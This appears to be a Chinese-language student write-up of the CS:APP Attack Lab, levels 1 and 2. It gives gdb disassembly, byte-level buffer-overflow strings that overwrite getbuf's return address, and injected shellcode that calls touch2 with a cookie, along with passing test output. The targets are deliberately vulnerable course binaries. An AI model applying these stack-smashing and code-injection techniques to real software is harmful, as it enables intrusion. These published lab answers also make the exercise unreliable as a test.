# Attack Lab

## 介绍

对2个有不同安全漏洞的程序进行5次攻击，完成后你将会收获：

- 学会针对缓冲区溢出漏洞进行攻击。
- 学会如何将程序写的更加安全，了解操作系统和编译的特征使程序出现更少的漏洞。
- 对x86-64机器代码的堆栈和参数传递有更深的理解。
- 对x86-64机器指令解码有更深的理解。
- 对gdb工具的熟练使用。

[实验帮助文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## Part I: Code Injection Attacks

前三个阶段利用**漏洞利用**字符串攻击`CTarget`。

### Level1

阶段1不需要代码注入，相反使用**漏洞利用**字符串就可以重定向程序执行另一现有程序。

`getbuf`函数在`CTarget`中被`test`函数被调用。

![](https://s3.ax1x.com/2021/01/02/rzfeat.png)

`getbuf`函数返回后会接着执行第5句代码，现在我们想改变这个行为。

![](https://s3.ax1x.com/2021/01/02/rzfaGT.png)

你的任务是改变程序执行方向，在`getbuf`函数返回后执行`touch1`函数。请注意，您的**漏洞利用**字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为`touch1`会导致程序直接退出。

思路是我们将`touch1`的起始地址的字节序列转为字符串后复写在返回地址在堆栈的位置。

首先我们使用反汇编查看一下`getbuf`和`touch1`函数。

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

字符串的地址是`%rsp-0x28`，`getbuf`函数的返回地址是在`%rsp`。我们只需将`touch1`的地址`0x4017c0`写在返回地址即可。

构造字符串字节序列。

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x28的空间
c0 17 40 00 00 00 00 00 # touch1函数的地址 / retq的返回地址
```

注意字节排列需要还与机器的**大小端**有关。我这里使用的机器是小端模式（数据的高字节保存在内存的高地址中）。

我们再使用`hex2raw`工具将字节序列转为字符串。

```bash
./hex2raw < attack1.txt > attackraw1.txt
```

接着拿我们得到的字符串去做检测。

```bash
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw1.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level2

阶段2在漏洞利用字符串里注入一小段代码。

![](https://s3.ax1x.com/2021/01/02/rzb9i9.png)

你的任务是`getbuf`函数之后跳转到`touch2`函数而不是返回`test`函数。你需要将你的`cookie`传入到`touch2`函数。实验文件夹下有一个的`cookie.txt`，记录了你的`cookie`。

思路仍是在复写堆栈中返回地址字节序列。我们可以利用字符串空间注入代码，将返回地址执行字符串首地址执行注入代码从而跳转到`touch2`函数。

注入代码需要的内容：

1. 将cookie放入`%rdi`第一个参数寄存器中。
2. 将`touch2`函数地址推入堆栈中。
3. 然后执行`retq`，调用`touch2`函数。

于是我们可以得到代码汇编代码：

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
retq
```

将其转为目标代码：

```bash
gcc -c attack2.s

# 然后再反汇编
objdump -d attack2.o

attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

我们注入代码的字节序列便是`48 c7 c7 ... c3`。

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) break *0x00000000004017af
Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) run -q
Starting program: /csapp/target1/ctarget -q
warning: Error disabling address space randomization: Operation not permitted
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14	buf.c: No such file or directory.
(gdb) p /x $rsp
$1 = 0x5561dc78
```

我们得到字符串起始地址是`%rsp`的值0x5561dc78。便可以构造字节序列。

```bash
48 c7 c7 fa 97 b9 59 68 # 注入代码
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # 字符串起始地址
```

利用工具将字节序列转为字符串。 

```bash
root@5139ac651595:/csapp/target1# ./hex2raw < attack2.txt > attckraw2.txt
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw2.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

